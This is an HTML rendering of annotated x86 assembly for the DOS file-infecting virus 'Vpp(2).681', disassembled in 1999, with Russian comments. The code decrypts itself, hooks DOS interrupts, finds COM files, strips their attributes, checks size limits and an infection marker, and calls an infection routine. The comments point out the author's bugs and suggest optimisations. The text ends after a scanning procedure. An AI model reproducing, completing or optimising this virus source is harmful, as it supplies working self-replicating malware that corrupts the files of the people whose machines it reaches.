<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>VPP2.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;Вирус Vpp(2).681 дизассемблирован 08.07.1999 (c) CrkV</span><span class="sc0">

</span><span class="sc1">;Ну вот видно, что мои комментарии не пропали даром ;-)))</span><span class="sc0">

</span><span class="sc1">;Только иногда полезно и в отладчик заглянуть, а то у меня</span><span class="sc0">
</span><span class="sc1">;сложилось такое мнение, что ты его на скорую руку переделал,</span><span class="sc0">
</span><span class="sc1">;при этом не удосужился и толком его проверить :-(((</span><span class="sc0">


</span><span class="sc5">DOSInt</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">

</span><span class="sc5">Int21h</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc5">DOSInt</span><span class="sc0">

</span><span class="sc1">;я всегда предпочитаю Int 3 и место экономим и глупых ламеров отпугнем</span><span class="sc0">

</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">tiny</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc2">.286</span><span class="sc0">
    </span><span class="sc9">Org</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
</span><span class="sc5">Vpp2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc2">103h</span><span class="sc0">
    </span><span class="sc6">PushA</span><span class="sc0">
    </span><span class="sc6">PushF</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Ds</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Es</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc2">103h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Bp</span><span class="sc4">,</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Entry_Point</span><span class="sc0">
    </span><span class="sc6">Jmp</span><span class="sc0"> </span><span class="sc5">@Start</span><span class="sc0">

</span><span class="sc5">Entry_Point</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Bp</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Si</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc8">Sp</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Bp</span><span class="sc4">,</span><span class="sc8">Ss</span><span class="sc4">:[</span><span class="sc8">Si</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Sub</span><span class="sc0"> </span><span class="sc8">Bp</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">          </span><span class="sc1">;получить адрес возврата</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ss</span><span class="sc4">:[</span><span class="sc8">Si</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">Bp</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">Bp</span><span class="sc0">     </span><span class="sc1">;Warning - а что за адрес ???</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc0">          </span><span class="sc1">;и вообще см. Vp, там все проще ;))</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Bp</span><span class="sc0">
    </span><span class="sc6">PushA</span><span class="sc0">               </span><span class="sc1">;сохраним все регистры</span><span class="sc0">
    </span><span class="sc6">PushF</span><span class="sc0">               </span><span class="sc1">;флаги тоже cохраним</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Ds</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Es</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Cs</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Ds</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Cs</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Es</span><span class="sc0">

</span><span class="sc1">;стек я бы тоже переключил, конечно вопрос спорный что надежнее,</span><span class="sc0">
</span><span class="sc1">;но так хоть префиксы перед [Bp] не надо ставить.</span><span class="sc0">

    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Bp</span><span class="sc4">,</span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;Warning - Ds могло поменяться !!!</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Bp</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">My_Point</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Bp</span><span class="sc0">                      </span><span class="sc1">;Bp:=Offset My_Point</span><span class="sc0">
    </span><span class="sc6">Sub</span><span class="sc0"> </span><span class="sc8">Bp</span><span class="sc4">,</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">My_Point</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Entry_Point</span><span class="sc0">
    </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc4">,[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">Part2</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;адрес расшифровки</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc8">Si</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc4">,</span><span class="sc2">0C6C6h</span><span class="sc0">

    </span><span class="sc9">Org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">Word_Shifr</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Entry_Point</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0C6C6h</span><span class="sc0">
    
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc5">Shifr_Lenght</span><span class="sc0">     </span><span class="sc1">;Opti-Mov Cx,266 Shr 1</span><span class="sc0">
    </span><span class="sc6">Shr</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">@LShifr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">LodSW</span><span class="sc0">
    </span><span class="sc6">Not</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc8">Bx</span><span class="sc0">
    </span><span class="sc6">Not</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">StoSW</span><span class="sc0">
    </span><span class="sc6">Loop</span><span class="sc0">    </span><span class="sc5">@LShifr</span><span class="sc0">

</span><span class="sc5">Part2</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Entry_Point</span><span class="sc0">
</span><span class="sc5">@Start</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Sub</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Cx</span><span class="sc0">           </span><span class="sc1">;Opti - выкинуть (loop)</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ds</span><span class="sc4">,</span><span class="sc8">Cx</span><span class="sc0">           </span><span class="sc1">;таблица прерываний</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Set_Int21h</span><span class="sc0">      </span><span class="sc1">;Int 20h &lt;-&gt; Int 21h</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Cs</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Ds</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">Func2Fh</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;Get DTA</span><span class="sc0">
    </span><span class="sc5">Int21h</span><span class="sc0">  
    </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc4">,[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">Save_DTA</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">],</span><span class="sc8">Es</span><span class="sc0">         </span><span class="sc1">;OPTI-поменять местами (для LDs)</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">Bx</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Cs</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Es</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">Func1Ah</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;Set DTA</span><span class="sc0">
    </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">New_DTA</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">Int21h</span><span class="sc0">              </span><span class="sc1">;устанавливаем свою DTA</span><span class="sc0">
    </span><span class="sc6">Jmp</span><span class="sc0"> </span><span class="sc5">@Restore_Byte</span><span class="sc0">

</span><span class="sc5">@Ok_Restore</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">Func4Eh</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;Find_First</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cl</span><span class="sc4">,</span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">AtrF</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">Mask_Com</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">@Find_File</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">Int21h</span><span class="sc0">
    </span><span class="sc6">Jc</span><span class="sc0">  </span><span class="sc5">@Exit</span><span class="sc0">
    </span><span class="sc6">Jmp</span><span class="sc0"> </span><span class="sc5">@Check_File</span><span class="sc0">

</span><span class="sc5">@Exit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">Func1Ah</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;Set DTA</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">Save_DTA</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc8">Dx</span><span class="sc0">           </span><span class="sc1">;Warning-описка (надо Mov Ds,Dx)</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">Save_DTA</span><span class="sc4">][</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">Int21h</span><span class="sc0">              </span><span class="sc1">;Восстанавливаем программную DTA</span><span class="sc0">
    </span><span class="sc6">Sub</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Cx</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ds</span><span class="sc4">,</span><span class="sc8">Cx</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Set_Int21h</span><span class="sc0">      </span><span class="sc1">;меняем обратно Int 20h &lt;-&gt; Int 21h</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Es</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Ds</span><span class="sc0">
    </span><span class="sc6">PopF</span><span class="sc0">
    </span><span class="sc6">PopA</span><span class="sc0">                </span><span class="sc1">;Восстанавливаем регистры</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Bp</span><span class="sc0">
    </span><span class="sc6">Sub</span><span class="sc0"> </span><span class="sc8">Bp</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">;Warning - ТАМ УЖЕ АДРЕС ВОЗВРАТА</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Bp</span><span class="sc0">
    </span><span class="sc6">Ret</span><span class="sc0">             </span><span class="sc1">;Выходим из вируса</span><span class="sc0">
</span><span class="sc1">;---------------------------------------</span><span class="sc0">
</span><span class="sc5">@Check_File</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">New_DTA</span><span class="sc4">+</span><span class="sc2">1Eh</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;найденное имя в DTA</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">Func4301h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;Set Atr</span><span class="sc0">
    </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Cx</span><span class="sc0">
    </span><span class="sc5">Int21h</span><span class="sc0">
    </span><span class="sc6">Jc</span><span class="sc0">  </span><span class="sc5">@Not_Infected</span><span class="sc0">

    </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">New_DTA</span><span class="sc4">+</span><span class="sc2">1Eh</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Opti - выкинуть</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">Func3D02h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;Open File (rd/wr)</span><span class="sc0">
    </span><span class="sc5">Int21h</span><span class="sc0">
    </span><span class="sc6">Jc</span><span class="sc0">  </span><span class="sc5">@Not_Infected</span><span class="sc0">
    </span><span class="sc6">Xchg</span><span class="sc0">    </span><span class="sc8">Bx</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">           </span><span class="sc1">;Bx:=Ax (File Handle)</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">Func4202h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;LSeek File</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">_0000h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc8">Cx</span><span class="sc0">           </span><span class="sc1">;OPTI-Cwd</span><span class="sc0">
    </span><span class="sc5">Int21h</span><span class="sc0">              </span><span class="sc1">;на выходе Dx:Ax - размер файла</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">          </span><span class="sc1">;OPTI-Or Dx,Dx</span><span class="sc0">
    </span><span class="sc6">Jne</span><span class="sc0"> </span><span class="sc5">@Not_Infected</span><span class="sc0">   
    </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">0400h</span><span class="sc0">
    </span><span class="sc6">Jle</span><span class="sc0"> </span><span class="sc5">@Not_Infected</span><span class="sc0">       </span><span class="sc1">;файл маловат</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">0F000h</span><span class="sc0">
    </span><span class="sc6">Jnb</span><span class="sc0"> </span><span class="sc5">@Not_Infected</span><span class="sc0">       </span><span class="sc1">;а вот этот велик ;-))</span><span class="sc0">

    </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc4">,[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">Save_Ofs</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">],</span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Sub</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
    </span><span class="sc6">Xchg</span><span class="sc0">    </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">

    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">Func4200h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;Lseek File</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">_0000h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">Int21h</span><span class="sc0">              </span><span class="sc1">;устанавливаем ук. на конец файла - 3</span><span class="sc0">

    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">Func3Fh</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;Read File</span><span class="sc0">
    </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">Save_Byte</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">_0003h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">Int21h</span><span class="sc0">              </span><span class="sc1">;Считаем 3 байта</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">Save_Byte</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc12">'+V'</span><span class="sc0">         </span><span class="sc1">;V+ - метка вируса</span><span class="sc0">
    </span><span class="sc6">Je</span><span class="sc0">  </span><span class="sc5">@Not_Infected</span><span class="sc0">       </span><span class="sc1">;возможно заражен</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">Func4200h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;Lseek File</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">_0000h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc8">Cx</span><span class="sc0">           </span><span class="sc1">;OPTI-Cwd</span><span class="sc0">
    </span><span class="sc5">Int21h</span><span class="sc0">              </span><span class="sc1">;устанавливаем ук. на начало файла</span><span class="sc0">

    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Infect</span><span class="sc0">

</span><span class="sc5">@Not_Infected</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">Func3Eh</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;Close File</span><span class="sc0">
    </span><span class="sc5">Int21h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">Func4301h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;Set Atr</span><span class="sc0">
    </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">New_DTA</span><span class="sc4">+</span><span class="sc2">1Eh</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">_0000h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cl</span><span class="sc4">,</span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">New_DTA</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;атрибуты из DTA</span><span class="sc0">
    </span><span class="sc5">Int21h</span><span class="sc0">
</span><span class="sc1">;вообще-то и время не мешало восстановить ;-))</span><span class="sc0">

</span><span class="sc5">@Exit_Check</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc8">Bp</span><span class="sc4">+</span><span class="sc5">Func4Fh</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;Find Next</span><span class="sc0">
    </span><span class="sc6">Jmp</span><span class="sc0"> </span><span class="sc5">@Find_File</span><span class="sc0">
</span><span class="sc1">;---------------------------------------</span><span class="sc0">
</span><span class="sc5">Scan</span><span class="sc0">    </span><span class="sc9">Proc</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Bx</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Cx</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Dx</span><span class="sc0">
    </span><span class="sc6">Cld</span><span class="sc0">                             </span><span class="sc1">;OPTI-выкинуть</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Al</span><span class="sc4">,[</span><span class="sc8">Si</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;0CDh</span><span class="sc0">

</span><span class="sc5">@Next_Scan</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Repne</span><span class="sc0">   </span><span class="sc6">ScaSB</span><span class="sc0">
    </span><span class="sc6">Jz</span><span class="sc0">  </span><span class="sc5">@Ok_Scan</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc2">0FFFFh</span><span class="sc0">
    </span><span class="sc6">Jmp</span><span class="sc0"> </span><span class="sc5">@Exit_Scan</span><span class="sc0">

</span><span class="sc5">@Ok_Scan</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Cx</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Di</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Si</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Bx</span><span class="sc0">
    </span><span class="sc6">Dec</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc0">
    </span><span class="sc6">Rep</span><span class="sc0"> </span><span class="sc6">CmpSB</span><span class="sc0">
    </span><span class="sc6">Je</span><span class="sc0">  </span><span class="sc5">@Find_Scan</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc0">
    </span><span class="sc6">Jmp</span><span class="sc0"> </span><span class="sc5">@Next_Scan</span><span class="sc0">

</span><span class="sc5">@Find_Scan</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc0">
    </span><span class="sc6">Dec</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc0">

</span><span class="sc5">@Exit_Scan</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Ret</span><span class="sc0">
